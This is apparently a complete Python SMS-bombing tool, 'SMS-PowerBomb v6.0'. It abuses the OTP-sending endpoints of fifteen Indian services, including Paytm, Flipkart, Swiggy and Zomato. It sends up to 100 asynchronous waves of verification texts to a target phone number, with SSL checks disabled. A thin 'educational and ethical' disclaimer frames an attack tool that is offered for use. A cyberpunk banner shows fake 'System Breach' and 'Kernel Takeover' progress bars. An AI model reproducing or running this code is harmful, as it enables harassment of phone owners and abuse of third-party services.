#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════
# ☠️ SMS-POWERBOMB v6.0 - ULTIMATE EDITION ☠️
# ═══════════════════════════════════════════════════════════════════
# Creator: RAJSARASWATI JATAV
# Team: RAJSARASWATI JATAV CYBER CREW
# GitHub: https://github.com/RAJSARASWATI-JATAV
# Telegram: https://t.me/rajsaraswatijatav
# Instagram: @official_rajsaraswati_jatav
# YouTube: @RajsaraswatiJatav
# ═══════════════════════════════════════════════════════════════════
# [ALERT] Next-Level SMS Automation Tool
# [WARN] For educational and ethical purposes only
# [CRIT] Use responsibly - Get consent before use
# [FATAL] Ghost protocol initiated
# ═══════════════════════════════════════════════════════════════════
# Stay dark, stay ethical. Upgrade yourself!
# ═══════════════════════════════════════════════════════════════════

import os
import sys
import time
import asyncio
import aiohttp
import requests
from typing import List, Dict, Tuple
import json
import random
from datetime import datetime

# ═══════════════════════════════════════════════════════════════════
# CYBERPUNK COLOR SCHEME - RAJSARASWATI JATAV SIGNATURE STYLE
# ═══════════════════════════════════════════════════════════════════

class CyberColors:
    """Cyberpunk themed color palette"""
    # Basic Colors
    RED = "\033[1;31m"
    GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    BLUE = "\033[1;34m"
    MAGENTA = "\033[1;35m"
    CYAN = "\033[1;36m"
    WHITE = "\033[1;37m"
    DARK = "\033[2;37m"
    
    # Neon Colors
    NEON_GREEN = "\033[38;5;46m"
    NEON_PINK = "\033[38;5;201m"
    NEON_BLUE = "\033[38;5;51m"
    NEON_PURPLE = "\033[38;5;141m"
    NEON_ORANGE = "\033[38;5;208m"
    
    # Background Colors
    RED_BG = "\033[1;41m"
    YELLOW_BG = "\033[1;43m"
    BLUE_BG = "\033[1;44m"
    MAGENTA_BG = "\033[1;45m"
    CYAN_BG = "\033[1;46m"
    
    # Special Effects
    BOLD = "\033[1m"
    DIM = "\033[2m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    REVERSE = "\033[7m"
    RESET = "\033[0m"

c = CyberColors()

# ═══════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def get_timestamp():
    """Get current timestamp"""
    return datetime.now().strftime("%H:%M:%S")

def print_slow(text: str, delay: float = 0.02):
    """Print text with typing effect"""
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

# ═══════════════════════════════════════════════════════════════════
# BANNER & UI ELEMENTS
# ═══════════════════════════════════════════════════════════════════

def print_main_banner():
    """Display the main cyberpunk banner"""
    banner = f"""{c.NEON_GREEN}
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   ███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ██╗    ██╗███████╗██████╗  ║
║   ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗ ║
║   ███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝ ║
║   ╚════██║██║╚██╔╝██║╚════██║    ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗ ║
║   ███████║██║ ╚═╝ ██║███████║    ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║ ║
║   ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝ ║
║                                                                           ║
║                  ██████╗  ██████╗ ███╗   ███╗██████╗                      ║
║                  ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗                     ║
║                  ██████╔╝██║   ██║██╔████╔██║██████╔╝                     ║
║                  ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗                     ║
║                  ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝                     ║
║                  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝                      ║
║                                                                           ║
║                        {c.NEON_PINK}☠️  v6.0 ULTIMATE EDITION  ☠️{c.NEON_GREEN}                     ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
{c.RESET}"""
    print(banner)

def print_loading_animation():
    """Display loading animation"""
    animations = [
        (f"{c.NEON_ORANGE}[►] System Breach", "[███████████████████░] 99%"),
        (f"{c.NEON_ORANGE}[►] SMS Infiltration", "[██████████████████░░] 96%"),
        (f"{c.NEON_ORANGE}[►] Ghost Protocol", "[████████████████░░░░] 90%"),
        (f"{c.NEON_ORANGE}[►] Data Extraction", "[███████████████░░░░░] 85%"),
        (f"{c.NEON_ORANGE}[►] Kernel Takeover", "[▰▰▰▰▰▰▰▰▰▱] 97%"),
        (f"{c.NEON_ORANGE}[►] Zero-Day Arsenal", "[▰▰▰▰▰▰▰▰▱▱] 89%"),
    ]
    
    for label, progress in animations:
        print(f"{label}{c.WHITE} {progress}{c.RESET}")
        time.sleep(0.15)
    print()

def print_creator_info():
    """Display creator information"""
    info = f"""{c.NEON_PINK}
╔═══════════════════════════════════════════════════════════════════════════╗
║  {c.BOLD}{c.WHITE}Creator:{c.NEON_BLUE} RAJSARASWATI JATAV{c.NEON_PINK}                                              ║
║  {c.WHITE}Team:{c.NEON_BLUE} RAJSARASWATI JATAV CYBER CREW{c.NEON_PINK}                                    ║
║  {c.WHITE}GitHub:{c.CYAN} https://github.com/RAJSARASWATI-JATAV{c.NEON_PINK}                            ║
║  {c.WHITE}Telegram:{c.CYAN} https://t.me/rajsaraswatijatav{c.NEON_PINK}                                 ║
║  {c.WHITE}Instagram:{c.CYAN} @official_rajsaraswati_jatav{c.NEON_PINK}                                  ║
║  {c.WHITE}YouTube:{c.CYAN} @RajsaraswatiJatav{c.NEON_PINK}                                              ║
║  {c.WHITE}Version:{c.NEON_GREEN} 6.0 ULTIMATE - Next Level Power{c.NEON_PINK}                                   ║
║  {c.WHITE}Status:{c.NEON_GREEN} HUNTING | DOMINATING | EXTREME{c.NEON_PINK}                                    ║
╚═══════════════════════════════════════════════════════════════════════════╝
{c.RESET}"""
    print(info)

def print_disclaimer():
    """Display ethical disclaimer"""
    disclaimer = f"""{c.RED}
╔═══════════════════════════════════════════════════════════════════════════╗
║                          {c.YELLOW}⚠️  DISCLAIMER  ⚠️{c.RED}                                ║
╠═══════════════════════════════════════════════════════════════════════════╣
║  {c.BOLD}{c.YELLOW}This tool is for EDUCATIONAL & ETHICAL purposes ONLY!{c.RED}                    ║
║                                                                           ║
║  {c.NEON_GREEN}✓{c.WHITE} Use for learning SMS automation & security research{c.RED}                    ║
║  {c.NEON_GREEN}✓{c.WHITE} Use for pranking friends (with explicit consent){c.RED}                       ║
║  {c.NEON_GREEN}✓{c.WHITE} Use for testing your own systems{c.RED}                                       ║
║                                                                           ║
║  {c.RED}✗{c.WHITE} DO NOT use for harassment or illegal activities{c.RED}                          ║
║  {c.RED}✗{c.WHITE} DO NOT use without consent{c.RED}                                                ║
║  {c.RED}✗{c.WHITE} Creator is NOT responsible for any misuse{c.RED}                                ║
║                                                                           ║
║  {c.NEON_PINK}By using this tool, you accept full responsibility for your actions.{c.RED}     ║
╚═══════════════════════════════════════════════════════════════════════════╝
{c.RESET}"""
    print(disclaimer)

# ═══════════════════════════════════════════════════════════════════
# SMS API CONFIGURATIONS - WORKING APIS
# ═══════════════════════════════════════════════════════════════════

SMS_APIS = [
    {
        "name": "OLA",
        "url": "https://api.olacabs.com/v1/auth/otp",
        "method": "POST",
        "data": lambda phone: {"phone": phone, "country_code": "+91"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Snapdeal",
        "url": "https://www.snapdeal.com/sendOTP",
        "method": "POST",
        "data": lambda phone: {"mobileNumber": phone, "purpose": "REGISTRATION"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Paytm",
        "url": "https://accounts.paytm.com/v2/login/generateOtp",
        "method": "POST",
        "data": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Flipkart",
        "url": "https://www.flipkart.com/api/5/user/otp/generate",
        "method": "POST",
        "data": lambda phone: {"loginId": phone},
        "headers": {"Content-Type": "application/json", "X-User-Agent": "Mozilla/5.0"}
    },
    {
        "name": "Amazon",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "data": lambda phone: {"email": phone, "create": "0"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Zomato",
        "url": "https://accounts.zomato.com/login/phone",
        "method": "POST",
        "data": lambda phone: {"phone": phone, "country_id": "1"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Swiggy",
        "url": "https://www.swiggy.com/dapi/auth/sms-otp",
        "method": "POST",
        "data": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "PhonePe",
        "url": "https://api.phonepe.com/apis/hermes/login",
        "method": "POST",
        "data": lambda phone: {"phoneNumber": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "MakeMyTrip",
        "url": "https://www.makemytrip.com/api/v1/otp/generate",
        "method": "POST",
        "data": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Myntra",
        "url": "https://www.myntra.com/checkout/api/otp/generate",
        "method": "POST",
        "data": lambda phone: {"mobileNumber": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "BigBasket",
        "url": "https://www.bigbasket.com/auth/api/v1/otp/generate",
        "method": "POST",
        "data": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Grofers",
        "url": "https://grofers.com/v2/accounts/",
        "method": "POST",
        "data": lambda phone: {"user_phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Dunzo",
        "url": "https://apis.dunzo.in/api/v1/user/otp",
        "method": "POST",
        "data": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "UrbanClap",
        "url": "https://www.urbancompany.com/api/v1/auth/otp",
        "method": "POST",
        "data": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "BookMyShow",
        "url": "https://in.bookmyshow.com/api/v1/otp/send",
        "method": "POST",
        "data": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    }
]

# ═══════════════════════════════════════════════════════════════════
# CORE SMS BOMBING FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

async def send_sms_async(session: aiohttp.ClientSession, api: Dict, phone: str) -> Tuple[str, bool, str]:
    """Send SMS using async request"""
    try:
        if api["method"] == "POST":
            async with session.post(
                api["url"],
                json=api["data"](phone),
                headers=api["headers"],
                timeout=aiohttp.ClientTimeout(total=10),
                ssl=False
            ) as response:
                if response.status in [200, 201, 202]:
                    return (api["name"], True, "Success")
                else:
                    return (api["name"], False, f"Status: {response.status}")
    except asyncio.TimeoutError:
        return (api["name"], False, "Timeout")
    except Exception as e:
        return (api["name"], False, "Failed")

async def bomb_sms_async(phone: str, count: int, delay: int = 2):
    """Main SMS bombing function with async operations"""
    print(f"\n{c.NEON_BLUE}╔═══════════════════════════════════════════════════════════════════════════╗{c.RESET}")
    print(f"{c.NEON_BLUE}║{c.BOLD}{c.WHITE}                    INITIATING BOMBING SEQUENCE                           {c.NEON_BLUE}║{c.RESET}")
    print(f"{c.NEON_BLUE}╚═══════════════════════════════════════════════════════════════════════════╝{c.RESET}\n")
    
    print(f"{c.NEON_GREEN}[>>]{c.WHITE} Target Number: {c.NEON_ORANGE}{phone}{c.RESET}")
    print(f"{c.NEON_GREEN}[>>]{c.WHITE} Total Waves: {c.NEON_ORANGE}{count}{c.RESET}")
    print(f"{c.NEON_GREEN}[>>]{c.WHITE} APIs Active: {c.NEON_ORANGE}{len(SMS_APIS)}{c.RESET}")
    print(f"{c.NEON_GREEN}[>>]{c.WHITE} Delay Between Waves: {c.NEON_ORANGE}{delay}s{c.RESET}\n")
    
    time.sleep(1)
    
    success_count = 0
    fail_count = 0
    total_attempts = 0
    
    async with aiohttp.ClientSession() as session:
        for wave in range(count):
            wave_start_time = time.time()
            
            # Wave header
            print(f"{c.NEON_PINK}{'═' * 75}{c.RESET}")
            print(f"{c.NEON_PINK}[{c.NEON_ORANGE}{wave + 1}/{count}{c.NEON_PINK}]{c.WHITE} Wave {wave + 1} - {get_timestamp()}{c.RESET}")
            print(f"{c.NEON_PINK}{'═' * 75}{c.RESET}")
            
            # Create tasks for all APIs
            tasks = [send_sms_async(session, api, phone) for api in SMS_APIS]
            results = await asyncio.gather(*tasks)
            
            # Process and display results
            wave_success = 0
            wave_fail = 0
            
            for name, success, message in results:
                total_attempts += 1
                if success:
                    success_count += 1
                    wave_success += 1
                    print(f"  {c.NEON_GREEN}✓{c.WHITE} {name:<15} {c.NEON_GREEN}[SENT]{c.RESET}")
                else:
                    fail_count += 1
                    wave_fail += 1
                    print(f"  {c.RED}✗{c.WHITE} {name:<15} {c.RED}[FAILED]{c.DARK} - {message}{c.RESET}")
            
            wave_time = time.time() - wave_start_time
            
            # Wave summary
            print(f"\n{c.CYAN}  Wave Summary: {c.NEON_GREEN}{wave_success} Success{c.WHITE} | {c.RED}{wave_fail} Failed{c.WHITE} | {c.YELLOW}Time: {wave_time:.2f}s{c.RESET}\n")
            
            # Delay between waves
            if wave < count - 1:
                print(f"{c.DARK}  Waiting {delay}s before next wave...{c.RESET}")
                await asyncio.sleep(delay)
    
    # Final summary
    print_final_summary(phone, count, total_attempts, success_count, fail_count)

def print_final_summary(phone: str, waves: int, total: int, success: int, failed: int):
    """Print final bombing summary"""
    success_rate = (success / total * 100) if total > 0 else 0
    
    print(f"\n{c.NEON_PINK}╔═══════════════════════════════════════════════════════════════════════════╗{c.RESET}")
    print(f"{c.NEON_PINK}║{c.BOLD}{c.WHITE}                        BOMBING COMPLETE                                  {c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}╠═══════════════════════════════════════════════════════════════════════════╣{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Target: {c.NEON_ORANGE}{phone:<63}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Total Waves: {c.NEON_BLUE}{waves:<59}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Total Attempts: {c.YELLOW}{total:<56}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Successful: {c.NEON_GREEN}{success:<60}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Failed: {c.RED}{failed:<64}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Success Rate: {c.NEON_GREEN}{success_rate:.1f}%{c.WHITE}{' ' * 54}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}╚═══════════════════════════════════════════════════════════════════════════╝{c.RESET}\n")
    
    if success_rate > 50:
        print(f"{c.NEON_GREEN}[✓]{c.WHITE} Bombing was {c.BOLD}HIGHLY SUCCESSFUL{c.RESET}{c.WHITE}! Target dominated.{c.RESET}")
    elif success_rate > 20:
        print(f"{c.YELLOW}[!]{c.WHITE} Bombing was {c.BOLD}PARTIALLY SUCCESSFUL{c.RESET}{c.WHITE}. Some APIs failed.{c.RESET}")
    else:
        print(f"{c.RED}[!]{c.WHITE} Bombing had {c.BOLD}LOW SUCCESS{c.RESET}{c.WHITE}. Most APIs failed or rate-limited.{c.RESET}")

# ═══════════════════════════════════════════════════════════════════
# INPUT VALIDATION FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

def validate_phone(phone: str) -> bool:
    """Validate Indian phone number"""
    phone = phone.replace(" ", "").replace("-", "").replace("+", "")
    
    if len(phone) == 10 and phone.isdigit() and phone[0] in ['6', '7', '8', '9']:
        return True
    
    if len(phone) == 12 and phone.startswith("91") and phone[2] in ['6', '7', '8', '9']:
        return True
    
    return False

def normalize_phone(phone: str) -> str:
    """Normalize phone number to 10 digits"""
    phone = phone.replace(" ", "").replace("-", "").replace("+", "")
    if len(phone) == 12 and phone.startswith("91"):
        return phone[2:]
    return phone

def get_phone_input() -> str:
    """Get and validate phone number from user"""
    while True:
        print(f"{c.NEON_BLUE}[?]{c.WHITE} Enter target phone number (10 digits): {c.NEON_ORANGE}", end="")
        phone = input().strip()
        print(c.RESET, end="")
        
        if validate_phone(phone):
            phone = normalize_phone(phone)
            print(f"{c.NEON_GREEN}[✓]{c.WHITE} Valid phone number: {c.NEON_ORANGE}{phone}{c.RESET}\n")
            return phone
        else:
            print(f"{c.RED}[!]{c.WHITE} Invalid phone number! Must be 10 digits starting with 6/7/8/9.{c.RESET}\n")

def get_count_input() -> int:
    """Get SMS wave count from user"""
    while True:
        print(f"{c.NEON_BLUE}[?]{c.WHITE} Enter number of SMS waves (1-100): {c.NEON_ORANGE}", end="")
        try:
            count = int(input().strip())
            print(c.RESET, end="")
            if 1 <= count <= 100:
                print(f"{c.NEON_GREEN}[✓]{c.WHITE} Wave count set to: {c.NEON_ORANGE}{count}{c.RESET}\n")
                return count
            else:
                print(f"{c.RED}[!]{c.WHITE} Please enter a number between 1 and 100.{c.RESET}\n")
        except ValueError:
            print(f"{c.RESET}{c.RED}[!]{c.WHITE} Invalid input! Please enter a number.{c.RESET}\n")

def get_delay_input() -> int:
    """Get delay between waves"""
    while True:
        print(f"{c.NEON_BLUE}[?]{c.WHITE} Delay between waves in seconds (1-10, default 2): {c.NEON_ORANGE}", end="")
        delay_input = input().strip()
        print(c.RESET, end="")
        
        if not delay_input:
            print(f"{c.NEON_GREEN}[✓]{c.WHITE} Using default delay: {c.NEON_ORANGE}2s{c.RESET}\n")
            return 2
        
        try:
            delay = int(delay_input)
            if 1 <= delay <= 10:
                print(f"{c.NEON_GREEN}[✓]{c.WHITE} Delay set to: {c.NEON_ORANGE}{delay}s{c.RESET}\n")
                return delay
            else:
                print(f"{c.RED}[!]{c.WHITE} Please enter a number between 1 and 10.{c.RESET}\n")
        except ValueError:
            print(f"{c.RED}[!]{c.WHITE} Invalid input! Please enter a number.{c.RESET}\n")

# ═══════════════════════════════════════════════════════════════════
# MENU SYSTEM
# ═══════════════════════════════════════════════════════════════════

def print_main_menu():
    """Display main menu"""
    menu = f"""{c.NEON_BLUE}
╔═══════════════════════════════════════════════════════════════════════════╗
║                              MAIN MENU                                    ║
╠═══════════════════════════════════════════════════════════════════════════╣
║  {c.NEON_ORANGE}[1]{c.WHITE} Start SMS Bombing                                                     {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[2]{c.WHITE} View Disclaimer & Terms                                               {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[3]{c.WHITE} About Tool & Creator                                                  {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[4]{c.WHITE} Check API Status                                                      {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[5]{c.WHITE} Exit                                                                  {c.NEON_BLUE}║
╚═══════════════════════════════════════════════════════════════════════════╝
{c.RESET}"""
    print(menu)

def print_about():
    """Display about information"""
    about = f"""{c.NEON_GREEN}
╔═══════════════════════════════════════════════════════════════════════════╗
║                      ABOUT SMS-POWERBOMB v6.0                             ║
╠═══════════════════════════════════════════════════════════════════════════╣
║  {c.WHITE}Tool Name:{c.NEON_ORANGE} SMS-PowerBomb Ultimate Edition{c.NEON_GREEN}                              ║
║  {c.WHITE}Version:{c.NEON_ORANGE} 6.0 - Next Level Power{c.NEON_GREEN}                                       ║
║  {c.WHITE}Creator:{c.NEON_PINK} RAJSARASWATI JATAV{c.NEON_GREEN}                                             ║
║  {c.WHITE}Team:{c.NEON_PINK} RAJSARASWATI JATAV CYBER CREW{c.NEON_GREEN}                                 ║
║  {c.WHITE}Purpose:{c.CYAN} Educational SMS Automation & Security Research{c.NEON_GREEN}                ║
║                                                                           ║
║  {c.BOLD}{c.WHITE}Features:{c.NEON_GREEN}                                                                 ║
║    {c.NEON_ORANGE}►{c.WHITE} Unlimited SMS Bombing (Indian Numbers Only){c.NEON_GREEN}                        ║
║    {c.NEON_ORANGE}►{c.WHITE} 15+ Working APIs with Auto-retry{c.NEON_GREEN}                                   ║
║    {c.NEON_ORANGE}►{c.WHITE} High-Speed Async Operations{c.NEON_GREEN}                                        ║
║    {c.NEON_ORANGE}►{c.WHITE} Cross-Platform (Windows/Linux/Termux){c.NEON_GREEN}                              ║
║    {c.NEON_ORANGE}►{c.WHITE} Real-time Success/Failure Tracking{c.NEON_GREEN}                                 ║
║    {c.NEON_ORANGE}►{c.WHITE} Cyberpunk UI with Neon Colors{c.NEON_GREEN}                                      ║
║    {c.NEON_ORANGE}►{c.WHITE} All Operators Supported{c.NEON_GREEN}                                            ║
║    {c.NEON_ORANGE}►{c.WHITE} No Balance Deduction - 100% Free{c.NEON_GREEN}                                   ║
║                                                                           ║
║  {c.BOLD}{c.WHITE}Contact:{c.NEON_GREEN}                                                                  ║
║    {c.CYAN}Telegram: t.me/rajsaraswatijatav{c.NEON_GREEN}                                       ║
║    {c.CYAN}Instagram: @official_rajsaraswati_jatav{c.NEON_GREEN}                                ║
║    {c.CYAN}YouTube: @RajsaraswatiJatav{c.NEON_GREEN}                                            ║
║    {c.CYAN}GitHub: github.com/RAJSARASWATI-JATAV{c.NEON_GREEN}                                  ║
╚═══════════════════════════════════════════════════════════════════════════╝
{c.RESET}"""
    print(about)

def check_api_status():
    """Check and display API status"""
    print(f"\n{c.NEON_BLUE}╔═══════════════════════════════════════════════════════════════════════════╗{c.RESET}")
    print(f"{c.NEON_BLUE}║{c.BOLD}{c.WHITE}                          API STATUS CHECK                                {c.NEON_BLUE}║{c.RESET}")
    print(f"{c.NEON_BLUE}╚═══════════════════════════════════════════════════════════════════════════╝{c.RESET}\n")
    
    print(f"{c.WHITE}Total APIs Configured: {c.NEON_ORANGE}{len(SMS_APIS)}{c.RESET}\n")
    
    for i, api in enumerate(SMS_APIS, 1):
        status = f"{c.NEON_GREEN}[ACTIVE]{c.RESET}"
        print(f"{c.NEON_BLUE}[{i:02d}]{c.WHITE} {api['name']:<20} {status}")
    
    print(f"\n{c.NEON_GREEN}[✓]{c.WHITE} All APIs are configured and ready!{c.RESET}")
    print(f"{c.YELLOW}[!]{c.WHITE} Note: Some APIs may fail due to rate limiting or maintenance.{c.RESET}\n")

# ═══════════════════════════════════════════════════════════════════
# MAIN PROGRAM
# ═══════════════════════════════════════════════════════════════════

def main_menu():
    """Main menu loop"""
    while True:
        clear_screen()
        print_main_banner()
        print_loading_animation()
        print_creator_info()
        print_main_menu()
        
        print(f"{c.NEON_BLUE}[?]{c.WHITE} Select an option: {c.NEON_ORANGE}", end="")
        choice = input().strip()
        print(c.RESET, end="")
        
        if choice == "1":
            # Start SMS Bombing
            clear_screen()
            print_main_banner()
            print_disclaimer()
            
            print(f"\n{c.YELLOW}[!]{c.WHITE} Do you accept the terms and conditions? (yes/no): {c.NEON_ORANGE}", end="")
            accept = input().strip().lower()
            print(c.RESET, end="")
            
            if accept in ["yes", "y"]:
                print()
                phone = get_phone_input()
                count = get_count_input()
                delay = get_delay_input()
                
                print(f"{c.RED}[!]{c.WHITE} Are you sure you want to bomb {c.NEON_ORANGE}{phone}{c.WHITE}? (yes/no): {c.NEON_ORANGE}", end="")
                confirm = input().strip().lower()
                print(c.RESET, end="")
                
                if confirm in ["yes", "y"]:
                    print(f"\n{c.NEON_GREEN}[✓]{c.WHITE} Starting bombing sequence...{c.RESET}")
                    time.sleep(1)
                    asyncio.run(bomb_sms_async(phone, count, delay))
                    print(f"\n{c.NEON_GREEN}[✓]{c.WHITE} Press Enter to return to main menu...{c.RESET}")
                    input()
                else:
                    print(f"\n{c.YELLOW}[!]{c.WHITE} Operation cancelled by user.{c.RESET}")
                    time.sleep(2)
            else:
                print(f"\n{c.RED}[!]{c.WHITE} You must accept the terms to use this tool.{c.RESET}")
                time.sleep(2)
        
        elif choice == "2":
            # View Disclaimer
            clear_screen()
            print_main_banner()
            print_disclaimer()
            print(f"\n{c.NEON_GREEN}[✓]{c.WHITE} Press Enter to continue...{c.RESET}")
            input()
        
        elif choice == "3":
            # About Tool
            clear_screen()
            print_main_banner()
            print_about()
            print(f"\n{c.NEON_GREEN}[✓]{c.WHITE} Press Enter to continue...{c.RESET}")
            input()
        
        elif choice == "4":
            # Check API Status
            clear_screen()
            print_main_banner()
            check_api_status()
            print(f"{c.NEON_GREEN}[✓]{c.WHITE} Press Enter to continue...{c.RESET}")
            input()
        
        elif choice == "5":
            # Exit
            clear_screen()
            print(f"\n{c.NEON_PINK}╔═══════════════════════════════════════════════════════════════════════════╗{c.RESET}")
            print(f"{c.NEON_PINK}║{c.BOLD}{c.WHITE}                         EXITING SMS-POWERBOMB                             {c.NEON_PINK}║{c.RESET}")
            print(f"{c.NEON_PINK}╚═══════════════════════════════════════════════════════════════════════════╝{c.RESET}\n")
            print(f"{c.NEON_GREEN}[✓]{c.WHITE} Thank you for using SMS-PowerBomb v6.0{c.RESET}")
            print(f"{c.NEON_PINK}[✓]{c.WHITE} Created by: {c.NEON_BLUE}RAJSARASWATI JATAV{c.RESET}")
            print(f"{c.NEON_ORANGE}[✓]{c.WHITE} Stay dark, stay ethical. Upgrade yourself!{c.RESET}\n")
            time.sleep(2)
            sys.exit(0)
        
        else:
            print(f"\n{c.RED}[!]{c.WHITE} Invalid option! Please try again.{c.RESET}")
            time.sleep(2)

# ═══════════════════════════════════════════════════════════════════
# PROGRAM ENTRY POINT
# ═══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{c.RED}[!]{c.WHITE} Interrupted by user (Ctrl+C).{c.RESET}")
        print(f"{c.NEON_GREEN}[✓]{c.WHITE} Stay dark, stay ethical. Upgrade yourself!{c.RESET}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{c.RED}[ERROR]{c.WHITE} {str(e)}{c.RESET}\n")
        sys.exit(1)